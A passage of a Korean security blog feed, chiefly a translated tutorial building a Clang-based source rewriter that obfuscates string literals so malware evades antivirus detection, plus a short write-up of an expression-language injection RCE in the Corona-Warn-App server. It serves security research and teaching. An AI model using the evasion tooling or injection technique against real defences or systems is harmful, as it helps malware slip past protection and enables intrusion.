&quot;</span> &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">EndSourceFileAction</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>&#123;            clang::SourceManager &amp;SM = ASTRewriter.getSourceMgr();            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> FileName = SM.getFileEntryForID(SM.getMainFileID())-&gt;getName();            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;** EndSourceFileAction for: &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;            <span class="hljs-comment">// Now emit the rewritten buffer.</span>            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;Here is the edited source file :\n\n&quot;</span>;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeS;            <span class="hljs-function">llvm::raw_string_ostream <span class="hljs-title">s</span><span class="hljs-params">(TypeS)</span></span>;            <span class="hljs-keyword">auto</span> FileID = SM.getMainFileID();            <span class="hljs-keyword">auto</span> ReWriteBuffer = ASTRewriter.getRewriteBufferFor(FileID);            <span class="hljs-keyword">if</span>(ReWriteBuffer != <span class="hljs-literal">nullptr</span>)                ReWriteBuffer-&gt;write((s));            <span class="hljs-keyword">else</span>&#123;                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;File was not modified\n&quot;</span>;                <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> result = s.str();            <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fo</span><span class="hljs-params">(FileName)</span></span>;                   <span class="hljs-keyword">if</span>(fo.is_open())                fo &lt;&lt; result;            <span class="hljs-keyword">else</span>                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;[!] Error saving result to &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        &#125;    &#125;;&#125;auto main(int argc, const char *argv[]) -&gt; int &#123;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::tooling;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> ClSetup;    <span class="hljs-function">CommonOptionsParser <span class="hljs-title">OptionsParser</span><span class="hljs-params">(argc, argv, ToolCategory)</span></span>;    <span class="hljs-function">ClangTool <span class="hljs-title">Tool</span><span class="hljs-params">(OptionsParser.getCompilations(),</span></span><span class="hljs-function"><span class="hljs-params">                   OptionsParser.getSourcePathList())</span></span>;    <span class="hljs-keyword">auto</span> Action = newFrontendActionFactory&lt;StringEncryptor::Action&gt;();    <span class="hljs-keyword">return</span> Tool.run(Action.get());&#125;</code></pre><p>이 boilerplate 코드는 공식 문서에서 가져와서 설명하지 않는다. 언급할만한 변경점은 <code>CreateASTConsumer</code>이다. 우리의 목표는 같은 translation unit에서 여러 transformation pass를 수행하는 것이다. consumers collection(필수 line: <code>consumer.push_back(&amp;...);</code>)에 항목들을 추가하면 된다.</p><h2 id="문자열-난독화-1"><a href="#문자열-난독화-1" class="headerlink" title="문자열 난독화"></a>문자열 난독화</h2><p>이 부분에서는 세 가지 단계로 구성된 문자열 난독화 패스에서 가장 중요한 구현 세부 사항을 설명한다.</p><ul><li>소스 코드에 문자열 리터럴을 찾는다.</li><li>그것들을 변수로 변환한다.</li><li>적절한 위치(함수 또는 전역 context 포함)에 변수 정의/할당을 삽입</li></ul><h3 id="소스-코드에서-문자열-리터럴-찾기"><a href="#소스-코드에서-문자열-리터럴-찾기" class="headerlink" title="소스 코드에서 문자열 리터럴 찾기"></a>소스 코드에서 문자열 리터럴 찾기</h3><p><code>StringConsumer</code>는 아래와 같이 정의될 수 있다.(<code>StringEncryptor</code> namespace의 앞부분)</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringEncryptionConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> StringEncryptor;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[StringEncryption] Registering ASTMatcher...\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">MatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = stringLiteral().bind(<span class="hljs-string">&quot;decl&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;&#125;;StringEncryptionConsumer StringConsumer = StringEncryptionConsumer();</code></pre><p>translation unit이 있으면 Clang이 AST에서 패턴을 찾을 수 있고 찾을 때마다 호출될 핸들러를 등록할 수 있다. <a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>는 강력한 패턴 매칭을 지원하지만 여기서는 문자열 리터럴만 찾으므로 충분히 활용되지 않는다.</p><p>우리는 <code>MatchHandler</code>를 구현하여 문제의 핵심을 파악할 수 있고 <code>MatchResult</code> instance를 얻을 수 있을 것이다. <code>MatchResult</code>는 식별된 AST 노드에 대한 참조와 중요한 context 정보를 포함한다.</p><p>클래스를 정의하여 <code>clang::ast_matchers::MatchFinder::MatchCallback</code>으로부터 좋은 stuff를 상속받자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MatchHandler</span> :</span> <span class="hljs-keyword">public</span> clang::ast_matchers::MatchFinder::MatchCallback &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">using</span> MatchResult = clang::ast_matchers::MatchFinder::MatchResult;    MatchHandler(clang::Rewriter *rewriter);    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> <span class="hljs-keyword">override</span></span>; <span class="hljs-comment">// callback function that runs whenever a Match is found.</span>&#125;;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//AVCLEANER_MATCHHANDLER_H</span></span></code></pre><p><code>MatchHandler.cpp</code>에서 <code>MatchHandler</code>의 생성자와 <code>run</code> 콜백 함수를 구현해야 한다. <code>MatchHandler</code>의 생성자는 나중에 사용할 <code>clang::Rewriter</code>의 instance만 저장하면 되므로 간단하다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang;MatchHandler::MatchHandler(clang::Rewriter *rewriter) &#123;    <span class="hljs-keyword">this</span>-&gt;ASTRewriter = rewriter;&#125;</code></pre><p><code>run</code>의 구현은 아래와 같다:</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *Decl = Result.Nodes.getNodeAs&lt;clang::StringLiteral&gt;(<span class="hljs-string">&quot;decl&quot;</span>);    clang::SourceManager &amp;SM = ASTRewriter-&gt;getSourceMgr();    <span class="hljs-comment">// skip strings in included headers</span>    <span class="hljs-keyword">if</span> (!SM.isInMainFile(Decl-&gt;getBeginLoc()))        <span class="hljs-keyword">return</span>;    <span class="hljs-comment">// strings that comprise less than 5 characters are not worth the effort</span>    <span class="hljs-keyword">if</span> (!Decl-&gt;getBytes().str().size() &gt; <span class="hljs-number">4</span>) &#123;        <span class="hljs-keyword">return</span>;    &#125;    climbParentsIgnoreCast(*Decl, clang::ast_type_traits::DynTypedNode(), Result.Context, <span class="hljs-number">0</span>);&#125;</code></pre><p>위에서 짚고 넘어갈 세 가지가 있다:</p><ul><li><code>StringEncryptionConsumer</code>에서 정의된 패턴과 일치하는 AST 노드를 추출한다. 그러기 위해서 바인딩된 패턴 identifier를 인자로 문자열을 예상하는 <code>getNodeAs</code>를 호출할 수 있다.(<code>const auto Matcher = stringLiteral().bind(&quot;decl&quot;)</code>)</li><li>분석 중인 translation unit에서 정의되지 않은 문자열은 넘어간다. 실제 우리가 만든 pass는 시스템 헤더를 translation unit에 복사하는 <em>Clang</em>의 전처리기 이후에 실행된다.</li><li>이제 문자열 리터럴을 처리할 준비가 됐다. 문자열 리터럴이 어떤 context에서 발견됐는지 알아야 하므로 사용자 정의 함수에서 추출된 노드(위의 경우 <code>climbParentsIgnoreCase</code>)를 AST에 대한 참조를 포함한 <code>Result.Context</code>를 통해 전달한다. 목표는 흥미로운 노드를 찾을 때까지 위쪽의 트리를 탐색하는 것이다. 이 경우에서 흥미로운 노드는 <code>CallExpr</code> 타입이다.</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span>MatchHandler::climbParentsIgnoreCast(<span class="hljs-keyword">const</span> StringLiteral &amp;NodeString, clang::ast_type_traits::DynTypedNode node,                                     clang::ASTContext *<span class="hljs-keyword">const</span> pContext, <span class="hljs-keyword">uint64_t</span> iterations) &#123;    ASTContext::DynTypedNodeList parents = pContext-&gt;getParents(NodeString);    <span class="hljs-keyword">if</span> (iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = pContext-&gt;getParents(node);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;Cast&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">return</span> climbParentsIgnoreCast(NodeString, parent, pContext, ++iterations);        &#125;        handleStringInContext(&amp;NodeString, pContext, parent);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>간단히 말해서 이 함수는 흥미로운 것(“Cast”가 아닌 것)을 찾을 때 까지 <code>StringLiteral</code> 노드의 부모 노드들을 재귀적으로 탐색한다. <code>handleStringInContext</code>는 복잡하지 않다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleStringInContext</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                         <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    StringRef ParentNodeKind = node.getNodeKind().asStringRef();    <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;CallExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleCallExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;InitListExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleInitListExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> &#123;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Unhandled context &quot;</span> &lt;&lt; ParentNodeKind &lt;&lt; <span class="hljs-string">&quot; for string &quot;</span> &lt;&lt; pLiteral-&gt;getBytes() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;</code></pre><p>위 코드에서 눈에 띄는 건 실제로 처리되는 노드가 두 종류인 것이다. 또한 필요할 때 추가하는 게 쉬워야 한다. 실제로 두 경우 이미 비슷하게 처리되고 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *FunctionCall = node.get&lt;clang::CallExpr&gt;();    <span class="hljs-keyword">if</span> (isBlacklistedFunction(FunctionCall)) &#123;        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// exclude printf-like functions when the replacement is not constant anymore (C89 standard...).</span>    &#125;    handleExpr(pLiteral, pContext, node);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleInitListExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                      <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    handleExpr(pLiteral, pContext, node);&#125;</code></pre><h3 id="문자열-리터럴-교체"><a href="#문자열-리터럴-교체" class="headerlink" title="문자열 리터럴 교체"></a>문자열 리터럴 교체</h3><p><a href="https://clang.llvm.org/doxygen/classclang_1_1CallExpr.html"><code>CallExpr</code></a>과 <a href="https://clang.llvm.org/doxygen/classclang_1_1InitListExpr.html"><code>InitListExpr</code></a>은 비슷하게 처리되므로 둘 다 사용할 수 있는 공통적인 함수를 정의한다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::handleExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    clang::SourceRange LiteralRange = clang::SourceRange(            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getBeginLoc()),            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc())    );    <span class="hljs-keyword">if</span>(shouldAbort(pLiteral, pContext, LiteralRange))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = translateStringToIdentifier(pLiteral-&gt;getBytes().str());    <span class="hljs-keyword">if</span>(!insertVariableDeclaration(pLiteral, pContext, LiteralRange, Replacement))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> ;    Globs::PatchedSourceLocation.push_back(LiteralRange);    <span class="hljs-keyword">return</span> replaceStringLiteral(pLiteral, pContext, LiteralRange, Replacement);&#125;</code></pre><ul><li>변수명을 무작위로 생성한다.</li><li>가까운 위치에서 빈 공간을 찾고 변수 선언을 삽입해라. 이것은 기본적으로 <code>ASTRewriter→InsertText()</code>를 둘러싼 wrapper이다.</li><li>1단계에서 생성된 identifier를 가진 문자열을 바꾼다.</li><li>collection에 문자열 리터럴의 위치를 추가한다. 이는 <code>InitListExpr</code>를 지날 때 같은 문자열 리터럴을 두 번 표시해주므로 유용하다.(이유는 알 수 없다).</li></ul><p>마지막 단계는 실제 구현이 어렵기 때문에 먼저 보자.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::replaceStringLiteral</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        clang::SourceRange LiteralRange,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; Replacement)</span> </span>&#123;    <span class="hljs-comment">// handle &quot;TEXT&quot; macro argument, for instance LoadLibrary(TEXT(&quot;ntdll&quot;));</span>    <span class="hljs-keyword">bool</span> isMacro = ASTRewriter-&gt;getSourceMgr().isMacroBodyExpansion(pLiteral-&gt;getBeginLoc());    <span class="hljs-keyword">if</span> (isMacro) &#123;        StringRef OrigText = clang::Lexer::getSourceText(CharSourceRange(pLiteral-&gt;getSourceRange(), <span class="hljs-literal">true</span>),                                                         pContext-&gt;getSourceManager(), pContext-&gt;getLangOpts());        <span class="hljs-comment">// weird bug with TEXT Macro / other macros...there must be a proper way to do this.</span>        <span class="hljs-keyword">if</span> (OrigText.find(<span class="hljs-string">&quot;TEXT&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            ASTRewriter-&gt;RemoveText(LiteralRange);            LiteralRange.setEnd(ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc().getLocWithOffset(<span class="hljs-number">-1</span>)));        &#125;    &#125;    <span class="hljs-keyword">return</span> ASTRewriter-&gt;ReplaceText(LiteralRange, Replacement);&#125;</code></pre><p>보통 텍스트 교체는 <code>ReplaceText</code> API를 쓰지만 많은 버그가 발생했다. 매크로의 경우 Clang의 API는 불규칙하게 동작하여 복잡하다. 예를 들어 <code>isMacroBodyExpansion()</code>을 통한 확인이 없으면 인자가 아니라 <code>&quot;TEXT&quot;</code>가 교체된다. <code>LoadLibrary(TEXT(&quot;ntdll&quot;))</code>에서<code>LoadLibrary(your_variable(&quot;ntdll&quot;))</code>로 잘못 교체되는 것이다.</p><p>이유는 <code>&quot;TEXT&quot;</code>가 <em>Clang</em>의 전처리기에 의해 처리될 때 <code>L&quot;ntdll&quot;</code>을 교체하는 매크로이기 때문이다. transformation pass는 전처리기 작업이 완료된 후 발생하므로 <code>&quot;ntdll&quot;</code>의 시작과 끝 위치를 쿼리 하는 것은 몇 글자가 빠진 잘못된 값이 나올 수 있어서 유용하지 않다. 불행하게도 기존 translation unit에 실제 위치를 쿼리하는 것은 Clang API를 이용하였고 시행착오를 거쳐서 해결 방법을 찾았다.</p><h3 id="인접한-빈-공간에-변수-선언-삽입"><a href="#인접한-빈-공간에-변수-선언-삽입" class="headerlink" title="인접한 빈 공간에 변수 선언 삽입"></a>인접한 빈 공간에 변수 선언 삽입</h3><p>이제 문자열 리터럴을 변수 identifier로 바꿀 수 있으니 변수를 정의하고 원래 문자열로 할당해야 한다. 패치된 소스 코드에 아무것도 덮어쓰지 않고 <code>char your_variable[] = &quot;ntdll&quot;</code>을 해야 한다.</p><p>두 가지 시나리오가 있다:</p><ul><li>문자열 리터럴이 함수 바디 안에 위치한다.</li><li>문자열 리터럴이 함수 바디 밖에 위치한다.</li></ul><p>후자는 문자열 리터럴이 사용되는 표현식의 시작 부분을 찾으면 돼서 가장 간단하다.</p><p>전자는 포함된 함수를 찾아야 한다. 그 후 Clang은 API로 함수 바디의 시작 위치를 쿼리 한다. 변수가 전체 함수에서 볼 수 있고 우리가 삽입한 토큰이 내용을 덮어 씌우지 않으므로 변수 선언을 삽입할 공간으로 이상적이다.</p><p>어떤 경우든 두 가지 상황은 <code>FunctionDecl</code> 혹은 <code>VarDecl</code> 타입의 노드가 발견될 때까지 모든 부모 노드를 방문해서 해결한다.</p><pre><code class="hljs cpp">MatchHandler::findInjectionSpot(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,                                <span class="hljs-keyword">const</span> clang::StringLiteral &amp;Literal, <span class="hljs-keyword">bool</span> IsGlobal, <span class="hljs-keyword">uint64_t</span> Iterations) &#123;    <span class="hljs-keyword">if</span> (Iterations &gt; CLIMB_PARENTS_MAX_ITER)        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">std</span>::runtime_error(<span class="hljs-string">&quot;Reached max iterations when trying to find a function declaration&quot;</span>);    ASTContext::DynTypedNodeList parents = Context-&gt;getParents(Literal);;    <span class="hljs-keyword">if</span> (Iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = Context-&gt;getParents(Parent);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;FunctionDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">auto</span> FunDecl = parent.get&lt;clang::FunctionDecl&gt;();            <span class="hljs-keyword">auto</span> *Statement = FunDecl-&gt;getBody();            <span class="hljs-keyword">auto</span> *FirstChild = *Statement-&gt;child_begin();            <span class="hljs-keyword">return</span> &#123;FirstChild-&gt;getBeginLoc(), FunDecl-&gt;getEndLoc()&#125;;        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;VarDecl&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">if</span> (IsGlobal) &#123;                <span class="hljs-keyword">return</span> parent.get&lt;clang::VarDecl&gt;()-&gt;getSourceRange();            &#125;        &#125;        <span class="hljs-keyword">return</span> findInjectionSpot(Context, parent, Literal, IsGlobal, ++Iterations);    &#125;&#125;</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/SCRT/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..bash run_example.sh test/string_simplest.c</code></pre><p><img src="/2020/11/22/idioth/av_evasion_part1/4.png"></p><p>보다시피 잘 동작한다. 지금 이 예제는 정규식으로 해결할 만큼 코드가 짧다. </p><h2 id="Going-further"><a href="#Going-further" class="headerlink" title="Going further"></a>Going further</h2><p>지금은 obfuscation pass의 이름이 <code>StringEncryptor</code>이지만 실제로 문자열이 암호화되지 않는다. 문자열을 암호화하려면 얼마나 많은 노력이 필요할까?</p><h3 id="To-be-continued…"><a href="#To-be-continued…" class="headerlink" title="To be continued…"></a>To be continued…</h3><p>문자열을 난독화하는 것은 쉬운 부분이지만 Clang API에 익숙해야 한다. 소스 코드 문서를 보는데 1~2주 정도 쓰는 것을 추천한다.</p><p>다음 파트에서는 자동으로 API import를 숨기는 것에 대해 다룰 것이다.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>bypass</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>obfuscation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] German Corona-Warn-App sever RCE</title>
    <link href="/2020/11/21/fabu1ous/2020-11-21/"/>
    <url>/2020/11/21/fabu1ous/2020-11-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/securing-the-fight-against-covid19-through-oss">Securing the fight against COVID-19</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Corona-Warn-App(contect tracking infrastructure of Germany)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Corona-Warn-App(이하 CWA)은 독일의 접촉자 기록/추적 인프라입니다. 이 앱이 설치된 스마트폰은 블루투스로 식별 payload를 브로드케스트하고, 블루투스의 신호 범위 내에 들어온 다른 디바이스들이 이 payload와 payload를 받은 시각을 2주간 저장합니다. 양성 판정을 받은 사용자는 검사 결과와 이에 대한 키값(Diagnosis key)을 CWA server에 전송할 수 있습니다.</p><p>CWA 서버는 Spring boot 프레임워크로 동작하며 Diagnosis key를 받아 처리하는 과정에서 <a href="https://securitylab.github.com/research/bean-validation-RCE">Java Bean Validation</a> 취약점이 존재합니다. </p><p>Spring boot app이 입력받은 객체를 validate 한다는 것은 그 객체가 constraint 조건에 만족하는지 확인하는 동작을 뜻합니다. constraint 조건은 ‘@’를 통해 사용합니다.</p><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Input</span> </span>&#123;  <span class="hljs-meta">@Min(1)</span>  <span class="hljs-meta">@Max(10)</span>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> num;    <span class="hljs-comment">//...</span>&#125;</code></pre><p>int형 num의 최솟값이 1, 최댓값이 10인 constraint 조건이 걸려있는 코드입니다. <code>@Min()</code>이나 <code>@Max()</code>처럼 built-in 조건만 있는 것이 아니라 custom constraint 또한 존재하고, 이를 이용한 validation을 custom constraint validation이라 부릅니다.</p><pre><code class="hljs powershell">input : ab<span class="hljs-variable">$</span>&#123;<span class="hljs-number">12</span>*<span class="hljs-number">12</span>&#125;<span class="hljs-built_in">cd</span>output : ab144<span class="hljs-built_in">cd</span></code></pre><p>custom constraint validation 동작 중 함수<code>buildConstraintViolationWithTemplate()</code>는 메세지 템플릿을 에러 메세지로 변환시켜줍니다. 메세지 템플릿에 <code>$&#123;&#125;</code>를 통해 Expression Language를 삽입할 수 있으며 그 실행결과가 에러 메세지에 반영됩니다. 만약 이 메세지 템플릿의 내용을 해커가 접근할 수 있다면 RCE 취약점입니다.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void add<span class="hljs-constructor">Violation(ConstraintValidatorContext <span class="hljs-params">validatorContext</span>, String <span class="hljs-params">message</span>)</span>&#123;    validatorContext.build<span class="hljs-constructor">ConstraintViolationWithTemplate(<span class="hljs-params">message</span>)</span>.add<span class="hljs-constructor">ConstraintViolation()</span>;&#125;</code></pre><p>CWA 서버는 <code>buildConstraintViolationWithTemplate()</code>을 호출하며 그 인자인 message는 사용자 입력값(Diagnosis key 속 데이터)이기 때문에 RCE 공격에 취약합니다. 사용자 입력을 sanitizing 하도록 패치되었지만, bypass가 가능하다는 평이 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>rce</tag>
      
      <tag>covid19</tag>
      
      <tag>ios</tag>
      
      <tag>germany</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13957: Apache Solr ConfigSet RCE Vulnerability</title>
    <link href="/2020/11/20/l0ch/2020-11-20/"/>
    <url>/2020/11/20/l0ch/2020-11-20/</url>
    
